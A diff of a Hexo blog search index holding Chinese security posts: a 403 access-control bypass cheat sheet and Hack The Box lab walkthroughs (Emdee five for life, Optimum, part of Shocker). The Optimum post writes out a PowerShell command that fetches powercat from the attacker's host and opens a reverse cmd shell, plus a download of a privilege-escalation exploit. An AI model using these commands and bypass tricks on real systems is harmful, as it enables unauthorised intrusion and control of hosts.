@@ -1,6 +1,258 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>403绕过小结</title>
+    <url>/2021/01/17/403%E7%BB%95%E8%BF%87%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期浏览到关于403绕过的技巧文章（<a href="https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ%EF%BC%89">https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ）</a></em></strong></p>
+<p><strong><em>饶有兴致，稍作小结，权当记录~</em></strong></p>
+<h2 id="0x01-改变请求方式："><a href="#0x01-改变请求方式：" class="headerlink" title="0x01 改变请求方式："></a><strong><em>0x01 改变请求方式：</em></strong></h2><h3 id="1、覆盖请求URL"><a href="#1、覆盖请求URL" class="headerlink" title="1、覆盖请求URL"></a><strong><em>1、覆盖请求URL</em></strong></h3><p><strong><em>尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制，通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。</em></strong></p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Original-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br><span class="line">	</span><br><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Rewrite-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、修改拓展名"><a href="#2、修改拓展名" class="headerlink" title="2、修改拓展名"></a><strong><em>2、修改拓展名</em></strong></h3><p><strong><em>基于扩展名，用于绕过403受限制的目录</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site.com&#x2F;admin &#x3D;&gt; 403</span><br><span class="line">site.com&#x2F;admin&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;* &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;*&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;.&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin?? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin??? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2f&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2e&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%20&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%09&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%20admin%20&#x2F; &#x3D;&gt; 200</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-改变请求内容："><a href="#0x02-改变请求内容：" class="headerlink" title="0x02 改变请求内容："></a><strong><em>0x02 改变请求内容：</em></strong></h2><h3 id="1、修改-添加-Referer或HOST头"><a href="#1、修改-添加-Referer或HOST头" class="headerlink" title="1、修改/添加 Referer或HOST头"></a><strong><em>1、修改/添加 Referer或HOST头</em></strong></h3><p><strong><em>若服务器之间的业务访问控制是通过Referer或HOST头去关联，则可以尝试修改/添加 Referer 或HOST头去绕</em></strong>~</p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、添加代理IP"><a href="#2、添加代理IP" class="headerlink" title="2、添加代理IP"></a><strong><em>2、添加代理IP</em></strong></h3><p><strong><em>若应用是通过代理识别访问端IP限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制~</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般代理头姿势如下：</span><br><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">  X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-个人小结："><a href="#0x03-个人小结：" class="headerlink" title="0x03 个人小结："></a><strong><em>0x03 个人小结：</em></strong></h2><p><strong><em>就针对绕过而言，不管是改变请求方式还是请求内容，目的其实都是让请求看起来是合理的。（不是屁话么？）</em></strong></p>
+]]></content>
+      <categories>
+        <category>安全技巧</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>HTB - Emdee five for life</title>
+    <url>/2021/01/24/HTB-Emdee-five-for-life/</url>
+    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到的一题。求解涉及简单爬虫，正好趁此重拾下python~</em></strong></p>
+<h2 id="0x01摸索过程："><a href="#0x01摸索过程：" class="headerlink" title="0x01摸索过程："></a><strong><em>0x01摸索过程：</em></strong></h2><p><strong><em>启动实例前稍稍瞄下，什么？Can you encrypt fast enough? 嗯。。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/1.png" class>
+
+<p><strong><em>启动实例，打开链接出现网页，意思上看来是要把显示的字段MD5加密后post，但经手工测试，不管手速多快，都是显示 too  slow！？ 嗯。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/2.png" class>
+
+<h2 id="0x02求解过程："><a href="#0x02求解过程：" class="headerlink" title="0x02求解过程："></a><strong><em>0x02求解过程：</em></strong></h2><p><strong><em>目前看来是要写个爬虫，爬取需加密的字段，经MD5加密后post回去呢。大体思路有了，先看下网页源码，看下post参数是啥</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/3.png" class>
+
+<p><strong><em>想想整个流程需要的python模块可以为：request、hashlib和BeautifulSoup，直击开干吧！</em></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># __author__=&#x27;lwof&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://68.183.34.159:30019&#x27;</span></span><br><span class="line">sessions = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geter</span>():</span></span><br><span class="line">	r = sessions.get(url = url)</span><br><span class="line">	soup = BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">	<span class="keyword">global</span> get</span><br><span class="line">	get = soup.h3.string</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dater</span>():</span></span><br><span class="line">	geter()</span><br><span class="line">	<span class="built_in">hash</span> = hashlib.md5(get.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">	<span class="keyword">global</span> data</span><br><span class="line">	data = &#123;<span class="string">&#x27;hash&#x27;</span>: <span class="built_in">hash</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poster</span>():</span></span><br><span class="line">	dater()</span><br><span class="line">	a = sessions.post(url = url,data = data )</span><br><span class="line">	print(a.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	poster()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()	</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>嘿嘿，直接获取到key~</em></strong></p>
+<img src="/2021/01/24/HTB-Emdee-five-for-life/4.png" class>
+
+<h2 id="0x03个人小结："><a href="#0x03个人小结：" class="headerlink" title="0x03个人小结："></a><strong><em>0x03个人小结：</em></strong></h2><p><strong><em>这题求解思路其实很简单，其中有个坑点是要用requests.session()去保持会话，新建会话又会返回too slow和新的需加密字段。但个人通过这题重拾了不少python的知识，还是要谢谢把这题发给我的那位朋友哈~</em></strong></p>
+]]></content>
+      <categories>
+        <category>安全实验</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>HTB-Optimum</title>
+    <url>/2021/01/24/HTB-Optimum/</url>
+    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到一个叫Optimum的靶机，第一次玩相关靶机全程不用msf，所以要记下来(<em>^▽^</em>)</em></strong></p>
+<h2 id="0x01探索阶段："><a href="#0x01探索阶段：" class="headerlink" title="0x01探索阶段："></a><strong><em>0x01探索阶段：</em></strong></h2><p><strong><em>靶机套路，废话不多说。先用祖传的nmap扫下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -F -O -sV --version-light 10.10.10.8 </span><br></pre></td></tr></table></figure>
+
+<p><strong><em>扫出结果如下，发现存在80端口，且为2.3版本HFS。</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-22 21:50 EST</span><br><span class="line">Nmap scan report for 10.10.10.8</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 99 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.76 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>再searchsploit下</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/1.png" class>
+
+<p><strong><em>查看下详情：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs -x windows&#x2F;remote&#x2F;39161.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/2.png" class>
+
+<p><strong><em>貌似是该py命令执行是基于nc.exe的，不方便的样子，找下其他exp。花了点功夫，找到一个用powershell的</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;49125</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/3.png" class>
+
+
+
+<h2 id="0x02突破阶段："><a href="#0x02突破阶段：" class="headerlink" title="0x02突破阶段："></a><strong><em>0x02突破阶段：</em></strong></h2><p><strong><em>因为该exp远程命令执行、靶机为windows、且网络只与kali相通。所以我的getshell思路是，远程命令利用powershell去下载kali里的powercat，然后反连nc。</em></strong></p>
+<p><strong><em>直接开干！！</em></strong></p>
+<p><strong><em>1、拉个powercat到kali先（<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1%EF%BC%89">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1）</a></em></strong></p>
+<p><strong><em>2、kali开web服务：sudo python -m SimpleHTTPServer 80</em></strong></p>
+<p><strong><em>3、kali  开个nc： nc -lvvp 4444</em></strong></p>
+<p><strong><em>4、构造下远程执行利用语句：</em></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 <span class="number">10.10</span><span class="number">.10</span><span class="number">.8</span> <span class="number">80</span> <span class="string">&quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.33/powercat.ps1&#x27;); powercat -c 10.10.14.33 -p 6666 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/4.png" class>
+
+<p><strong><em>成功getshell！！！！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/5.png" class>
+
+<p><strong><em>但貌似还只是低权限呢，只能抓个user.txt。。。。</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/6.png" class>
+
+
+
+<h2 id="0x03提权阶段："><a href="#0x03提权阶段：" class="headerlink" title="0x03提权阶段："></a><strong><em>0x03提权阶段：</em></strong></h2><p><strong><em>拿shell后，systeminfo一波后给Windows-Exploit-Suggester分析下</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/7.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/8.png" class>
+
+<p><strong><em>踩了点坑后，将矛头直接对准ms16-098</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/9.png" class>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41020</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/10.png" class>
+
+<img src="/2021/01/24/HTB-Optimum/11.png" class>
+
+<p><strong><em>下载到kali后，然后在shell上使用powershell传到靶机上去！</em></strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;Invoke-WebRequest -Uri http://10.10.14.33/bfill.exe -OutFile C:\Users\kostas\Desktop\bfill.exe</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/24/HTB-Optimum/12.png" class>
+
+<p><strong><em>运行后直接变为system权限！</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/13.png" class>
+
+<p><strong><em>有权限后后切换administrator目录找到root.txt</em></strong></p>
+<img src="/2021/01/24/HTB-Optimum/14.png" class>
+
+
+
+<h2 id="0x04个人小结："><a href="#0x04个人小结：" class="headerlink" title="0x04个人小结："></a><strong><em>0x04个人小结：</em></strong></h2><p>该靶机的攻略过程看似中规中矩的，但在突破阶段在不使用msf的情况下找合适exp，及提权阶段的漏洞筛选、工具查找、及基于powershell的上传操作其实是坑点，个人在实操过程深有体会~~</p>
+]]></content>
+      <categories>
+        <category>安全实验</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>HTB-Shocker</title>
+    <url>/2021/02/03/HTB-Shocker/</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天空闲时间又在玩HTB，一个叫Shocker的退役靶机。还是太菜，打不过。在观看IPPSEC大神的视频后，才拓然开朗！！！大神就是叼叼的，在这边安利一波 ：<a href="https://youtu.be/IBlTdguhgfY">https://youtu.be/IBlTdguhgfY</a></p>
+<h2 id="0x01-探索过程"><a href="#0x01-探索过程" class="headerlink" title="0x01 探索过程"></a>0x01 探索过程</h2><h3 id="端口探索"><a href="#端口探索" class="headerlink" title="端口探索"></a>端口探索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -A -v  -sS 10.10.10.56</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br></pre></td></tr></table></figure>
+
+<p>嗯，发现开了80和2222端口</p>
+<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit   apache 2.4                                                   130 ⨯</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                      |  Path</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Co | php/remote/29290.c</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execu | php/remote/29316.py</span><br><span class="line">Apache 2.2.4 - 413 Error HTTP Request Method Cross- | unix/remote/30835.sh</span><br><span class="line">Apache 2.4.17 - Denial of Service                   | windows/dos/39037.php</span><br><span class="line">Apache 2.4.17 &lt; 2.4.38 - <span class="string">&#x27;apache2ctl graceful&#x27;</span> <span class="string">&#x27;log | linux/local/46676.php</span></span><br><span class="line"><span class="string">Apache 2.4.23 mod_http2 - Denial of Service         | linux/dos/40909.py</span></span><br><span class="line"><span class="string">Apache 2.4.7 + PHP 7.0.2 - &#x27;</span>openssl_seal()<span class="string">&#x27; Uniniti | php/remote/40142.php</span></span><br><span class="line"><span class="string">Apache 2.4.7 mod_status - Scoreboard Handling Race  | linux/dos/34133.txt</span></span><br><span class="line"><span class="string">Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak    | linux/webapps/42745.py</span></span><br><span class="line"><span class="string">Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service | multiple/dos/26710.txt</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuck.c<span class="string">&#x27; Remot | unix/remote/21671.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/47080.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/764.c</span></span><br><span class="line"><span class="string">Apache OpenMeetings 1.9.x &lt; 3.1.0 - &#x27;</span>.ZIP<span class="string">&#x27; File Dir | linux/webapps/39642.txt</span></span><br><span class="line"><span class="string">Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE | multiple/remote/48410.rb</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>RealPath.jsp<span class="string">&#x27; Informat | multiple/remote/21492.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>Source.jsp<span class="string">&#x27; Informatio | multiple/remote/21490.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root  | multiple/remote/21491.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 5.5.17 - Remote Directory Listing   | multiple/remote/2061.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | multiple/remote/6229.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | unix/remote/14489.c</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | jsp/webapps/42966.py</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | windows/webapps/42953.txt</span></span><br><span class="line"><span class="string">Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Serv | linux/dos/36906.txt</span></span><br><span class="line"><span class="string">Webfroot Shoutbox &lt; 2.32 (Apache) - Local File Incl | linux/remote/34.pl</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Web探索"><a href="#Web探索" class="headerlink" title="Web探索"></a>Web探索</h3><img src="/2021/02/03/HTB-Shocker/1.png" class>
+
+<h4 id="目录扫描："><a href="#目录扫描：" class="headerlink" title="目录扫描："></a>目录扫描：</h4><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56       </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30</span><br><span class="line">Wordlist size: 10832</span><br><span class="line"></span><br><span class="line">Error Log: /home/lw0f/tools/dirsearch/logs/errors-21-02-03_20-50-01.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /home/lw0f/tools/dirsearch/reports/10.10.10.56/_21-02-03_20-50-02.txt</span><br><span class="line"></span><br><span class="line">[20:50:02] Starting: </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.bak1                             </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.orig </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.save</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessBAK</span><br><span class="line">[20:50:11] 403 -  299B  - /.htaccessOLD2          </span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessOLD</span><br><span class="line">[20:50:11] 403 -  301B  - /.htaccess_extra</span><br><span class="line">[20:50:11] 403 -  290B  - /.htm</span><br><span class="line">[20:50:11] 403 -  291B  - /.html</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccess_sc</span><br><span class="line">[20:50:11] 403 -  296B  - /.htpasswds</span><br><span class="line">[20:50:11] 403 -  300B  - /.htpasswd_test</span><br><span class="line">[20:50:11] 403 -  297B  - /.httr-oauth</span><br><span class="line">[20:50:11] 403 -  297B  - /.ht_wsr.txt                         </span><br><span class="line">[20:50:11] 403 -  302B  - /.htaccess.sample                    </span><br><span class="line">[20:50:12] 403 -  300B  - /.htaccess_orig   </span><br><span class="line">[20:50:58] 403 -  294B  - /cgi-bin/                                     </span><br><span class="line">[20:51:17] 200 -  137B  - /index.html                         </span><br><span class="line">[20:51:42] 403 -  300B  - /server-status/                      </span><br><span class="line">[20:51:42] 403 -  299B  - /server-status</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>嗯发现burp也抓不了页面、换了dirbuster也扫不出内容，咋继续？貌似陷入僵局了。。。。。。。</p>
+<p>偷瞄下 ippsec的视频后，发现突破口在/cgi-bin/  ，及扫描姿势，换个gobuster试试 ~</p>
+<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt -t 50 -s200,204,301,302,307,401,403 -x pl,sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.56/cgi-bin/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/dirb/wordlists/small.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     pl,sh</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:23 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/user.sh (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:49 Finished</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找到了 user.sh ,这下应该能抓包了，尝试shellshock试下！！</p>
+<h3 id="突破阶段"><a href="#突破阶段" class="headerlink" title="突破阶段"></a>突破阶段</h3><h4 id="what-a-shellshock！！"><a href="#what-a-shellshock！！" class="headerlink" title="what  a  shellshock！！"></a>what  a  shellshock！！</h4><img src="/2021/02/03/HTB-Shocker/2.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/3.png" class>
+
+<img src="/2021/02/03/HTB-Shocker/4.png" class>
+
+
+
+<h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><h4 id="把哑shell换成tty先"><a href="#把哑shell换成tty先" class="headerlink" title="把哑shell换成tty先"></a>把哑shell换成tty先</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/03/HTB-Shocker/5.png" class>
+
+<h4 id="sudo-l-看下"><a href="#sudo-l-看下" class="headerlink" title="sudo -l 看下"></a>sudo -l 看下</h4><img src="/2021/02/03/HTB-Shocker/6.png" class>
+
